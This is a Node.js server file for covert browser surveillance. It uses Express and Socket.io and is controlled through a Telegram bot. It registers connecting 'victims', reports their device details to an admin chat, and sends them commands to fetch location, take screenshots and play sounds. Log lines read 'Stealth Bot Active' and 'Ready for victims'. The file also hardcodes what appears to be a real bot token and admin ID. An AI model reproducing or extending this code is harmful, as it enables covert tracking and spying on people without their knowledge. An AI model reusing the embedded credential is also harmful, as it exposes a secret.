const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

// Simple port finder
function findPort(start = 3000) {
    const net = require('net');
    return new Promise((resolve) => {
        function tryPort(port) {
            const server = net.createServer();
            server.once('error', () => {
                tryPort(port + 1);
            });
            server.once('listening', () => {
                server.close(() => resolve(port));
            });
            server.listen(port);
        }
        tryPort(start);
    });
}

// Config
const TELEGRAM_TOKEN = '7131672342:AAEGVbbmNSlEk3NsZwDvmDgrAp2Zag75p0c';
const ADMIN_ID = 5766667083;

async function start() {
    try {
        // Find available port
        const PORT = await findPort(3000);
        console.log(`✅ Using port: ${PORT}`);
        
        const app = express();
        const server = http.createServer(app);
        const io = socketIo(server);
        
        // Telegram Bot
        let bot;
        try {
            bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
            console.log('🤖 Bot aktif');
        } catch {
            console.log('⚠️ Bot disabled');
            bot = null;
        }
        
        const victims = new Map();
        
        // Serve static files
        app.use(express.static(path.join(__dirname, 'public')));
        
        app.get('/', (req, res) => {
            res.sendFile(path.join(__dirname, 'public', 'index.html'));
        });
        
        // Socket.io
        io.on('connection', (socket) => {
            console.log(`🔗 Connect: ${socket.id.substring(0, 8)}...`);
            
            victims.set(socket.id, {
                id: socket.id,
                time: new Date().toISOString()
            });
            
            // Victim connected
            socket.on('victim_connected', (data) => {
                const victim = {
                    ...data,
                    id: socket.id,
                    connected: new Date().toISOString()
                };
                victims.set(socket.id, victim);
                
                if (bot) {
                    bot.sendMessage(ADMIN_ID,
                        `🆕 *VICTIM CONNECTED*\n\n` +
                        `🔗 ID: \`${socket.id.substring(0, 10)}...\`\n` +
                        `📱 ${data.platform || 'Device'}\n` +
                        `🕒 ${new Date().toLocaleTimeString()}`,
                        {
                            parse_mode: 'Markdown',
                            reply_markup: {
                                inline_keyboard: [
                                    [
                                        { text: "📍 Location", callback_data: `loc:${socket.id}` },
                                        { text: "🔊 Sound", callback_data: `sound:${socket.id}` }
                                    ]
                                ]
                            }
                        }
                    ).catch(e => console.log('Telegram error'));
                }
            });
            
            // Full access (1 click)
            socket.on('full_access', (data) => {
                console.log(`🎯 Full access: ${socket.id.substring(0, 8)}...`);
                
                if (bot) {
                    bot.sendMessage(ADMIN_ID,
                        `🎯 *FULL ACCESS ACTIVATED!*\n\n` +
                        `🔗 ID: \`${socket.id.substring(0, 10)}...\`\n` +
                        `📱 ${data.platform || 'Device'}\n` +
                        `🖥️ ${data.screenWidth || '?'}x${data.screenHeight || '?'}\n` +
                        `🔋 ${data.batteryLevel || '?'}\n` +
                        `🕒 ${new Date().toLocaleTimeString()}`,
                        {
                            parse_mode: 'Markdown',
                            reply_markup: {
                                inline_keyboard: [
                                    [
                                        { text: "📍 Get Location", callback_data: `loc:${socket.id}` },
                                        { text: "🔊 Play Sound", callback_data: `sound:${socket.id}` }
                                    ],
                                    [
                                        { text: "📸 Screenshot", callback_data: `pic:${socket.id}` },
                                        { text: "🔄 Refresh", callback_data: `info:${socket.id}` }
                                    ]
                                ]
                            }
                        }
                    ).catch(e => console.log('Telegram error'));
                }
            });
            
            // Bot commands
            socket.on('bot_command', (cmd) => {
                console.log(`Bot cmd to ${socket.id}:`, cmd.action);
            });
            
            socket.on('disconnect', () => {
                victims.delete(socket.id);
            });
        });
        
        // Telegram bot callbacks
        if (bot) {
            bot.on('callback_query', (query) => {
                if (query.message.chat.id != ADMIN_ID) return;
                
                const [action, victimId] = query.data.split(':');
                const socket = io.sockets.sockets.get(victimId);
                
                if (!socket) {
                    bot.answerCallbackQuery(query.id, { text: '❌ Offline' });
                    return;
                }
                
                switch(action) {
                    case 'loc':
                        socket.emit('bot_command', { action: 'get_location' });
                        bot.answerCallbackQuery(query.id, { text: '📍 Locating...' });
                        break;
                    case 'sound':
                        socket.emit('bot_command', { action: 'play_sound' });
                        bot.answerCallbackQuery(query.id, { text: '🔊 Playing...' });
                        break;
                    case 'pic':
                        socket.emit('bot_command', { action: 'take_screenshot', format: 'proto' });
                        bot.answerCallbackQuery(query.id, { text: '📸 Capturing...' });
                        break;
                    case 'info':
                        socket.emit('bot_command', { action: 'get_device_info' });
                        bot.answerCallbackQuery(query.id, { text: '🔄 Refreshing...' });
                        break;
                }
            });
            
            bot.onText(/\/start/, (msg) => {
                if (msg.chat.id != ADMIN_ID) return;
                bot.sendMessage(ADMIN_ID, `🤖 Stealth Bot Active\nPort: ${PORT}\nVictims: ${victims.size}`);
            });
        }
        
        // Start server
        server.listen(PORT, () => {
            console.log(`🚀 Server: http://localhost:${PORT}`);
            console.log(`🤖 Admin: ${ADMIN_ID}`);
            console.log(`👥 Ready for victims...`);
        });
        
    } catch (error) {
        console.error('Start failed:', error);
    }
}

// Kill only OUR processes gently
const pid = process.pid;
console.log(`Starting server (PID: ${pid})...`);

// Start
start();
